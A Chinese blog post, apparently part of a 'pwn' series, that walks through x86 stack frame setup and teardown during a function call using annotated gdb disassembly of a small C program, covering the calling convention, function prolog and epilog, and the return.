<p>使用 gdb 查看 </p>
<p>main 部分汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">(gdb) break main</span><br><span class="line"></span><br><span class="line">Breakpoint 1 at 0x8048388: file testprog5.c, line 14.</span><br><span class="line"></span><br><span class="line">(gdb) disass main</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line"></span><br><span class="line">0x0804836c &lt;main+0&gt;:    push   %ebp                   ;main stack frame</span><br><span class="line"></span><br><span class="line">0x0804836d &lt;main+1&gt;:    mov    %esp, %ebp</span><br><span class="line"></span><br><span class="line">0x0804836f &lt;main+3&gt;:    sub    $0x8, %esp</span><br><span class="line"></span><br><span class="line">0x08048372 &lt;main+6&gt;:    and    $0xfffffff0, %esp</span><br><span class="line"></span><br><span class="line">0x08048375 &lt;main+9&gt;:    mov    $0x0, %eax</span><br><span class="line"></span><br><span class="line">0x0804837a &lt;main+14&gt;:   add    $0xf, %eax</span><br><span class="line"></span><br><span class="line">0x0804837d &lt;main+17&gt;:   add    $0xf, %eax</span><br><span class="line"></span><br><span class="line">0x08048380 &lt;main+20&gt;:   shr    $0x4, %eax</span><br><span class="line"></span><br><span class="line">0x08048383 &lt;main+23&gt;:   shl    $0x4, %eax</span><br><span class="line"></span><br><span class="line">0x08048386 &lt;main+26&gt;:   sub    %eax, %esp</span><br><span class="line"></span><br><span class="line">0x08048388 &lt;main+28&gt;:   movb   $0x41, 0xffffffff(%ebp) ;prepare the byte of ‘A’</span><br><span class="line"></span><br><span class="line">0x0804838c &lt;main+32&gt;:   movsbl 0xffffffff(%ebp), %eax  ;put into eax</span><br><span class="line"></span><br><span class="line">0x08048390 &lt;main+36&gt;:   push   %eax           ;push the third parameter, ‘A’ prepared in eax onto the stack, [ebp+16]</span><br><span class="line"></span><br><span class="line">0x08048391 &lt;main+37&gt;:   push   $0x2            ;push the second parameter, 2 onto the stack, [ebp+12]</span><br><span class="line"></span><br><span class="line">0x08048393 &lt;main+39&gt;:   push   $0x1            ;push the first parameter, 1 onto the stack, [ebp+8]</span><br><span class="line"></span><br><span class="line">------------------------------------------------</span><br><span class="line"></span><br><span class="line">0x08048395 &lt;main+41&gt;:   call   0x8048334 &lt;TestFunc&gt;   ;function call. Push the return address [0x0804839a] onto the stack, [ebp+4]</span><br><span class="line"></span><br><span class="line">------------------------------------------------</span><br><span class="line"></span><br><span class="line">0x0804839a &lt;main+46&gt;:   add    $0xc, %esp      ;cleanup the 3 parameters pushed on the stack at [ebp+8], [ebp+12] and [ebp+16] total up 12 bytes</span><br><span class="line"></span><br><span class="line">0x0804839d &lt;main+49&gt;:   mov    $0x0, %eax</span><br><span class="line"></span><br><span class="line">0x080483a2 &lt;main+54&gt;:   leave</span><br><span class="line"></span><br><span class="line">0x080483a3 &lt;main+55&gt;:   ret</span><br><span class="line"></span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>TestFunc 部分汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">(gdb) break TestFunc</span><br><span class="line"></span><br><span class="line">Breakpoint 2 at 0x8048342: file testprog5.c, line 5.</span><br><span class="line"></span><br><span class="line">(gdb) disass TestFunc</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function TestFunc:</span><br><span class="line"></span><br><span class="line">0x08048334 &lt;TestFunc+0&gt;:        push   %ebp                 ;push the previous stack frame pointer onto the stack, [ebp+0]</span><br><span class="line"></span><br><span class="line">0x08048335 &lt;TestFunc+1&gt;:        mov    %esp, %ebp      ;copy the ebp into esp, now the ebp and esp are pointing at the same address, creating new stack frame [ebp+0]</span><br><span class="line"></span><br><span class="line">0x08048337 &lt;TestFunc+3&gt;:        push   %edi                   ;save/push edi register, [ebp-4]</span><br><span class="line"></span><br><span class="line">0x08048338 &lt;TestFunc+4&gt;:        push   %esi                   ;save/push esi register, [ebp-8]</span><br><span class="line"></span><br><span class="line">0x08048339 &lt;TestFunc+5&gt;:        sub    $0x20, %esp       ;subtract esp by 32 bytes for local variable and buffer if any, go to [ebp-40]</span><br><span class="line"></span><br><span class="line">0x0804833c &lt;TestFunc+8&gt;:        mov    0x10(%ebp), %eax      ;move by pointer, [ebp+16] into the eax,[ebp+16]à ‘A’?</span><br><span class="line"></span><br><span class="line">0x0804833f &lt;TestFunc+11&gt;:       mov    %al, 0xfffffff7(%ebp)     ;move by pointer, byte of al into [ebp-9]</span><br><span class="line">0x08048342 &lt;TestFunc+14&gt;:       movl   $0x3, 0xfffffff0(%ebp)  ;move by pointer, 3 into [ebp-16]</span><br><span class="line">0x08048349 &lt;TestFunc+21&gt;:       movl   $0x4, 0xffffffec(%ebp) ;move by pointer, 4 into [ebp-20]</span><br><span class="line"></span><br><span class="line">0x08048350 &lt;TestFunc+28&gt;:       lea    0xffffffd8(%ebp), %edi  ;load address [ebp-40] into edi</span><br><span class="line"></span><br><span class="line">0x08048353 &lt;TestFunc+31&gt;:       mov    $0x8048484, %esi     ;move string into esi</span><br><span class="line"></span><br><span class="line">0x08048358 &lt;TestFunc+36&gt;:       cld                                            ;clear direction flag</span><br><span class="line"></span><br><span class="line">0x08048359 &lt;TestFunc+37&gt;:       mov    $0x7, %ecx                  ;move 7 into ecx as counter for the array</span><br><span class="line"></span><br><span class="line">0x0804835e &lt;TestFunc+42&gt;:       repz movsb %ds:(%esi), %es:(%edi)    ;start copy by pointer from esi to edi register</span><br><span class="line"></span><br><span class="line">0x08048360 &lt;TestFunc+44&gt;:       mov    $0x0, %eax                   ;move return value into eax, 0 in this case, no return value</span><br><span class="line"></span><br><span class="line">0x08048365 &lt;TestFunc+49&gt;:       add    $0x20, %esp                 ;add 32 bytes to esp, back to [ebp-8]</span><br><span class="line"></span><br><span class="line">0x08048368 &lt;TestFunc+52&gt;:       pop    %esi                         ;restore the esi, [ebp-4]</span><br><span class="line"></span><br><span class="line">0x08048369 &lt;TestFunc+53&gt;:       pop    %edi                         ;restore the edi, [ebp+0]</span><br><span class="line"></span><br><span class="line">0x0804836a &lt;TestFunc+54&gt;:       leave          ;restoring the ebp to the previous stack frame, [ebp+4]</span><br><span class="line"></span><br><span class="line">0x0804836b &lt;TestFunc+55&gt;:       ret               ;transfer control back to calling function using the saved return address at [ebp+8]</span><br><span class="line"></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>​		这里使用的约定是允许被调用者在返回之前弄乱 EAX、ECX 和 EDX 寄存器的值。 因此，如果调用者想要保留 EAX、ECX 和 EDX 的值，则调用者必须在进行函数调用之前将它们显式保存在堆栈中。 另一方面，被调用者必须恢复 EBX、ESI 和 EDI 寄存器的值。 如果被调用者对这些寄存器进行了更改，则被调用者还必须将受影响的寄存器保存在堆栈中，并在稍后返回之前恢复原始值。</p>
<p>​		4 个字节或更少的返回值存储在 EAX 寄存器中。 如果需要超过 4 个字节的返回值，则调用者将额外的第一个参数传递给被调用者。 这个额外的参数是应该存储返回值的位置的地址。 例如，对于 C 函数调用： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x = TestFunc(a, b, c);</span><br></pre></td></tr></table></figure>

<p>将会被转化成如下的样子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TestFunc(&amp;x, a, b, c);</span><br></pre></td></tr></table></figure>

<p>请注意，这只发生在返回超过 4 个字节的函数调用中。 在我们的示例中，调用者是 main() 函数，即将调用函数 TestFunc()，即被调用者。 在函数调用之前，main() 将 ESP 和 EBP 寄存器用于其自己的堆栈帧。 首先，main() 将寄存器 EAX、ECX 和 EDX 的内容压入堆栈（如果有）（图中未显示）。 这是一个可选步骤，仅当需要保留这三个寄存器的内容时才执行。</p>
<p>第一步：将参数按照从右到左的顺序压入栈中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">TestFunc(1, 2, &#x27;A&#x27;);</span><br><span class="line">0x08048388 &lt;main+28&gt;:   movb   $0x41, 0xffffffff(%ebp);prepare the byte of ‘A’</span><br><span class="line">0x0804838c &lt;main+32&gt;:   movsbl 0xffffffff(%ebp), %eax ;put into eax</span><br><span class="line"></span><br><span class="line">0x08048390 &lt;main+36&gt;:   push   %eax                   ;push the third parameter, ‘A’ prepared in eax onto the stack, [ebp+16]</span><br><span class="line"></span><br><span class="line">0x08048391 &lt;main+37&gt;:   push   $0x2                   ;push the second parameter, 2 onto the stack [ebp+12]</span><br><span class="line"></span><br><span class="line">0x08048393 &lt;main+39&gt;:   push   $0x1                   ;push the first parameter, 1 ont the stack, [ebp+8]</span><br></pre></td></tr></table></figure>

<p>栈变化如图</p>
<p>之前：</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3_files/image001.png" alt="Initial state of the stack"></p>
<p>之后：</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3_files/image002.png" alt="Pushing the parameters on the stack from right to left"></p>
<p>第二步：调用 TestFunc()，将函数返回地址，即 CALL 指令之后的地址压入堆栈。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08048395 &lt;main+41&gt;:   call   0x8048334 &lt;TestFunc&gt;   ;function call.Push the return address [0x0804839a] onto the stack, [ebp+4]</span><br></pre></td></tr></table></figure>

<p>该指令调用函数TestFunc()，其开头位于地址0x8048334。</p>
<p>当执行 CALL 指令时，EIP 寄存器的内容被压入堆栈。 EIP 寄存器包含紧跟在 CALL 指令之后的指令的偏移量，供以后用作函数的返回地址。 由于 EIP 寄存器指向 main() 中的下一条指令，因此返回地址现在位于堆栈顶部。 在 CALL 指令之后，下一个执行周期从名为 TestFunc 的标签开始。</p>
<p>之前：</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3_files/image003.png" alt="Ready to call a function, operation transferred to the function"></p>
<p>之后：</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3_files/image004.png" alt="Push the function return address onto the stack"></p>
<p>第三步：设置堆栈帧，保存寄存器，为局部变量和缓冲区分配存储空间。</p>
<p>当在函数 TestFunc() 中，被调用者获得程序的控制权时，它必须做 3 件事：建立自己的堆栈帧，根据需要保存寄存器 EBX、ESI 和 EDI 的内容并为本地存储分配空间（ 局部变量和缓冲区）。 这称为<strong>function prolog</strong>，TestFunc() 的示例如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x08048334 &lt;TestFunc+0&gt;:        push   %ebp        ;push the previous stack frame pointer onto the stack, [ebp+0]</span><br><span class="line"></span><br><span class="line">0x08048335 &lt;TestFunc+1&gt;:        mov    %esp, %ebp   ;copy the ebp into esp, now the ebp and esp are pointing at the same address,creating new stack frame [ebp+0]</span><br><span class="line"></span><br><span class="line">0x08048337 &lt;TestFunc+3&gt;:        push   %edi        ;save/push edi register, [ebp-4]</span><br><span class="line"></span><br><span class="line">0x08048338 &lt;TestFunc+4&gt;:        push   %esi        ;save/push esi register, [ebp-8]</span><br><span class="line"></span><br><span class="line">0x08048339 &lt;TestFunc+5&gt;:        sub    $0x20, %esp  ;subtract esp by 32 bytes for local variable and buffer if any, go to [ebp-40]</span><br></pre></td></tr></table></figure>

<p>EBP 寄存器当前指向 main() 堆栈帧中的位置。 必须保留此值。 因此，EBP 被压入堆栈。 然后ESP的内容被传送到EBP。 这允许函数的参数被引用为 EBP 的偏移量，并释放堆栈寄存器-ESP 来做其他事情。</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3_files/image005.png" alt="Pushing the EBP onto the stack, saving the previous stack frame"></p>
<p>因此，几乎所有的 C 函数都会以以下两条汇编指令开始：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048334 &lt;TestFunc+0&gt;:        push   %ebp</span><br><span class="line">0x08048335 &lt;TestFunc+1&gt;:        mov    %esp, %ebp</span><br></pre></td></tr></table></figure>

<p>在函数内部，参数从基指针 (EBP) 的正偏移量访问，局部变量作为基指针的负偏移量访问。 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">push        ebp                ; Save ebp, the previous frame</span><br><span class="line">mov         ebp, esp           ; Set the new stack frame pointer</span><br><span class="line">sub         esp, localbytes    ; Allocate space for locals</span><br><span class="line">push        &lt;registers&gt;        ; Optionally, save registers if any</span><br><span class="line"></span><br><span class="line">e.g.</span><br><span class="line"></span><br><span class="line">00411A30  push        ebp        ; Save ebp</span><br><span class="line"></span><br><span class="line">00411A31  mov         ebp, esp   ; Set the new stack frame pointer</span><br><span class="line"></span><br><span class="line">00411A33  sub         esp, 0C0h  ; Allocate space for locals</span><br><span class="line"></span><br><span class="line">00411A39  push        ebx        ; optionally, save register if any</span><br><span class="line"></span><br><span class="line">00411A3A  push        esi        ; save register if any</span><br><span class="line"></span><br><span class="line">00411A3B  push        edi        ; save register if any</span><br></pre></td></tr></table></figure>

<p>localbytes 变量表示局部变量所需的堆栈上的字节数，而 <registers> 变量是一个占位符，表示要保存在堆栈上的寄存器列表（如果有）。 压入寄存器后，您可以将任何其他适当的数据放在堆栈中。 在 Linux&#x2F;Intel 中，最后两条指令的顺序互换，如下面的代码所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">push        %ebp                ; Save ebp</span><br><span class="line">mov         %ebp, %esp          ; Set stack frame pointer</span><br><span class="line">push        &lt;registers&gt;         ; optionally, save registers if any</span><br><span class="line">sub         localbytes, %esp    ; Allocate space for locals</span><br><span class="line"></span><br><span class="line">e.g.</span><br><span class="line"></span><br><span class="line">push   %ebp         ;push the previous stack frame pointer onto the stack, [ebp+0]</span><br><span class="line"></span><br><span class="line">mov    %esp, %ebp    ;copy the ebp into esp, now the ebp and esp are pointing at the same address, creating new stack frame [ebp+0]</span><br><span class="line"></span><br><span class="line">push   %edi         ;save/push edi register, [ebp-4]</span><br><span class="line"></span><br><span class="line">push   %esi         ;save/push esi register, [ebp-8]</span><br><span class="line"></span><br><span class="line">sub    $0x20, %esp   ;subtracts esp by 32 bytes for local variable and buffer if any, go to [ebp-40]</span><br></pre></td></tr></table></figure>

<p>在我们的程序示例中，看起来 ESI 和 EDI 寄存器的内容已被保留，这意味着 TestFunc() 将使用这些寄存器。 这就是为什么这些寄存器被压入堆栈的原因。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x08048337 &lt;TestFunc+3&gt;:    push   %edi  ;save/push edi register, [ebp-4]</span><br><span class="line"></span><br><span class="line">0x08048338 &lt;TestFunc+4&gt;:    push   %esi  ;save/push esi register, [ebp-8]</span><br></pre></td></tr></table></figure>

<p>然后，TestFunc() 必须为其局部变量分配空间。 它还必须为它可能需要的任何临时存储（缓冲区）分配空间。 例如，TestFunc() 中的一些 C 语句可能有表达式来完成函数的任务。 在表达式&#x2F;语句操作期间，可能存在必须存储在某处的中间值。 这些位置通常称为缓冲区，因为它们可以重用于下一个表达式、动态分配和释放的数据。 在这个程序示例中，从堆栈指针中减去了 32 (0x20) 个字节，即局部变量的 esp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08048339 &lt;TestFunc+5&gt;:    sub    $0x20, %esp     ;subtract esp by 32 bytes for local variable and buffer if any, go to [ebp-40]</span><br></pre></td></tr></table></figure>

<p>然后将局部变量压入堆栈。 请记住，TestFunc() 不执行任何操作，因此没有用于函数操作的缓冲区。 这里的操作似乎是假的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0x0804833c &lt;TestFunc+8&gt;:    mov    0x10(%ebp), %eax       ;move by pointer, [ebp+16] into the eax, [ebp+16]à‘A’?</span><br><span class="line"></span><br><span class="line">0x0804833f &lt;TestFunc+11&gt;:   mov    %al, 0xfffffff7(%ebp) ;move by pointer, byte of al into [ebp-9]</span><br><span class="line"></span><br><span class="line">0x08048342 &lt;TestFunc+14&gt;:   movl   $0x3, 0xfffffff0(%ebp);move by pointer, 3 into [ebp-16]</span><br><span class="line"></span><br><span class="line">0x08048349 &lt;TestFunc+21&gt;:   movl   $0x4, 0xffffffec(%ebp);move by pointer, 4 into [ebp-20]</span><br><span class="line"></span><br><span class="line">0x08048350 &lt;TestFunc+28&gt;:   lea    0xffffffd8(%ebp), %edi ;load address [ebp-40] into edi</span><br><span class="line"></span><br><span class="line">0x08048353 &lt;TestFunc+31&gt;:   mov    $0x8048484, %esi       ;move string into esi</span><br><span class="line"></span><br><span class="line">0x08048358 &lt;TestFunc+36&gt;:   cld                          ;clear direction flag</span><br><span class="line"></span><br><span class="line">0x08048359 &lt;TestFunc+37&gt;:   mov    $0x7, %ecx         ;move 7 into ecx as counter for the array</span><br><span class="line"></span><br><span class="line">0x0804835e &lt;TestFunc+42&gt;:   repz movsb %ds:(%esi), %es:(%edi) ;start copy by pointer from esi to edi register</span><br></pre></td></tr></table></figure>

<p>现在可以执行函数 TestFunc() 的主体。 这可能涉及推入和弹出堆栈。 因此，堆栈指针 ESP 可能会上下移动，但 EBP 寄存器保持固定。 这很方便，因为这意味着我们始终可以将第一个函数参数称为 [EBP + 8]，而不管函数中进行了多少推入和弹出。 函数 TestFunc() 的执行也可能涉及其他函数调用，甚至对 TestFunc() 的递归调用。 但是，只要在从这些调用返回时恢复 EBP 寄存器，对参数、局部变量和缓冲区的引用就可以继续作为 EBP 的偏移量进行。 不同的汇编语言&#x2F;编译器之间的过程序言非常一致，因为它们可能使用相同的函数调用约定。</p>
<p>之前：</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3_files/image006.png" alt="Set up the stack frame, save registers, allocates storage for local variables and the buffer"></p>
<p>之后：</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3_files/image007.png" alt="Set up the stack frame, save registers, allocates storage for local variables and the buffer and processing happens"></p>
<p>​		堆栈总是向下增长（从高内存地址到低内存地址）。 要访问局部变量，请通过从 ebp 中减去适当的值以及从 ebp 开始从 [ebp+8] 开始的具有正偏移量的参数来计算 ebp 的负偏移量。</p>
<p>​		如果有的话，在将控制权返回给调用者之前，被调用者 TestFunc() 必须首先安排将返回值存储在 EAX 寄存器中。 我们已经讨论了带返回值的函数调用如何存储值。 在我们的程序示例中，0 被移动到 EAX，因为没有返回值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08048360 &lt;TestFunc+44&gt;:    mov    $0x0, %eax   ;move return value into eax,0 in this case, no return value</span><br></pre></td></tr></table></figure>

<p>第四步：拆除堆栈帧（释放局部变量和缓冲区的存储空间）</p>
<p>这一步称为<strong>function epilog</strong>。 以下是我们的 Linux&#x2F;Intel程序示例，它使用 __cdelc 函数调用约定，其中堆栈清理由调用者完成。 在此之前，预拆解是由被调用方完成的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x08048365 &lt;TestFunc+49&gt;:   add    $0x20, %esp     ;add 32 bytes to esp, back to [ebp-8]</span><br><span class="line"></span><br><span class="line">0x08048368 &lt;TestFunc+52&gt;:   pop    %esi           ;restore the esi, [ebp-4]</span><br><span class="line"></span><br><span class="line">0x08048369 &lt;TestFunc+53&gt;:   pop    %edi           ;restore the edi, [ebp+0]</span><br></pre></td></tr></table></figure>

<p>32 字节被添加到 esp，然后 esp 现在指向 [ebp-8] 以便破坏局部变量和缓冲区。 然后 esi ([ebp-4]) 和 edi ([ebp-8]) 从堆栈中弹出。 esp and ebp 现在指向之前保存的 ebp [ebp+0]。</p>
<p>不同的汇编语言&#x2F;编译器之间的函数结语不一致，原因之一是如前所述使用的不同函数调用约定。 以下是使用 __cdecl 的函数结语代码示例（Windows&#x2F;Intel），其中堆栈清理由调用者完成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">pop         &lt;registers&gt;   ; Restore registers</span><br><span class="line"></span><br><span class="line">mov         esp, ebp      ; Restore stack pointer</span><br><span class="line"></span><br><span class="line">pop         ebp           ; Restore ebp</span><br><span class="line"></span><br><span class="line">ret                      ; Return from function</span><br><span class="line"></span><br><span class="line">--------Back to the calling function------------</span><br><span class="line"></span><br><span class="line">add         esp, &lt;localbytes&gt;     ; cleanup the parameters</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">e.g</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">00411A6A  pop         edi</span><br><span class="line"></span><br><span class="line">00411A6B  pop         esi</span><br><span class="line"></span><br><span class="line">00411A6C  pop         ebx</span><br><span class="line"></span><br><span class="line">00411A6D  mov         esp, ebp</span><br><span class="line"></span><br><span class="line">00411A6F  pop         ebp</span><br><span class="line"></span><br><span class="line">00411A70  ret</span><br><span class="line"></span><br><span class="line">----------Back to the calling function------------</span><br><span class="line"></span><br><span class="line">00411AB9  add         esp, 8</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>之前：</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3_files/image008.png" alt="Dismantling the stack frame"></p>
<p>之后：</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3_files/image009.png" alt="Dismantling the stack frame, restore the previous stack frame"></p>
<p>STEP 5：函数调用返回，紧接CALL指令后进入下一条指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0804836a &lt;TestFunc+54&gt;:    leave   ;restoring the ebp to the previous stack frame, [ebp+4]</span><br><span class="line"></span><br><span class="line">0x0804836b &lt;TestFunc+55&gt;:    ret     ;transfer control back to calling function using the saved return address at [ebp+8]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>旧的帧指针 B（保存的前一个 EBP）然后从堆栈帧中弹出。 实际上，这会将 EBP 移回前一个调用者堆栈帧 (B) 的底部，并且 esp 现在指向返回地址。 然后返回地址被弹出并加载到 EIP 中。 控制权现在转移到 main()。 main() 中的以下代码表明已经从 esp 中减去了 12 个字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0804839a &lt;main+46&gt;:   add    $0xc, %esp   ;cleanup the 3 parameters pushed on the stack at [ebp+8], [ebp+12] and [ebp+16]total up is 12 bytes = 0xc</span><br></pre></td></tr></table></figure>

<p>这使得三个参数离开堆栈（4 字节 x 3 &#x3D; 12 字节）并且 esp 现在指向前一个堆栈帧 (T) 的顶部。 此时TestFunc()栈帧已经被拆除，栈帧的状态已经恢复到前一栈帧，如步骤1。</p>
<p>之前：</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3_files/image010.png" alt="Return from function call"></p>
<p>之后：</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3_files/image011.png" alt="Return from function call, the stack has been destroyed back to the initial state"></p>
<p>本节的主要目的是演示函数调用过程中栈帧的构造和销毁。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/09/BO7-%E6%A0%88%E6%93%8D%E4%BD%9C/" data-id="cl6x1oijd000g6mgqfqmhgpy9" data-title="栈操作" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-BO2-X86架构基础" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/09/21/BO2-X86%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80/" class="article-date">
  <time class="dt-published" datetime="2021-09-20T16:00:00.000Z" itemprop="datePublished">2021-09-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/09/21/BO2-X86%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80/">X86架构基础</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
